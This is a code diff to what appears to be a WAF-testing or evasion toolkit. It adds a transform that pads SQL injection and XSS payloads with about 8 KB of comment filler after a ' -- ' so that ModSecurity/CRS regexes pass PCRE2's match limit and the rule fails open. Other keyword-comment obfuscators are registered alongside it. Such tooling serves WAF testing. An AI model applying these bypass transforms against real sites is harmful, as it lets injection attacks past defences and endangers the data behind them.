@@ -52,6 +52,26 @@ def adjacent_comment_keyword(s: str) -> str:
     return _replace_keywords(s, lambda kw: f"/**//**/{kw}")
 
 
+# ~8 KB of comment-pattern filler. The '/**/' run both inflates @rxGlobal's
+# per-position match attempts and stresses the very comment-detection regexes
+# most prone to backtracking; a leading ' -- ' line comment makes all of it inert
+# in SQL so the real payload still executes.
+_PCRE_PAD = "/**/" * 2000
+
+
+def pcre_matchlimit_pad(s: str) -> str:
+    """Append ~8 KB of filler to drive a CRS regex past PCRE2's match-step limit.
+
+    Targets the @rxGlobal match-limit fail-open (GHSA-5m93-4h75-3p2w): once a
+    regex exceeds PCRE2's limit (CRS ships a low SecPcreMatchLimit, ~1500),
+    PCRE2 returned MATCHLIMIT, which ModSecurity turned into a no-match — the rule
+    fails open. The ' -- ' comments the filler out for the DB, so the payload is
+    unchanged. Operationally similar to the junk_prefix_param transform, but it
+    targets the regex engine's step limit, not the body-size inspection cutoff.
+    """
+    return s + " -- " + _PCRE_PAD
+
+
 def versioned_comment(s: str) -> str:
     """MySQL version-gated comment around every keyword: SELECT -> /*!50000SELECT*/."""
     return _replace_keywords(s, lambda kw: f"/*!50000{kw}*/")
@@ -222,6 +242,9 @@ def _register() -> None:
           classes=_SQL)
     R.add("sql_adjacent_comment_keyword", adjacent_comment_keyword, "obfuscator",
           "keyword -> /**//**/KEYWORD adjacent comments (CVE-2026-104259)", classes=_SQL)
+    R.add("sql_pcre_matchlimit_pad", pcre_matchlimit_pad, "obfuscator",
+          "append ~8KB filler to trip PCRE2 @rxGlobal match-limit fail-open (GHSA-5m93-4h75-3p2w)",
+          classes=_SQL | {"XSS Injection"})
     R.add("sql_versioned_comment_mysql", versioned_comment, "obfuscator",
           "MySQL /*!50000KEYWORD*/ version-gated comments", classes=_SQL)
     R.add("sql_versioned_comment_generic", versioned_comment_mssql, "obfuscator",
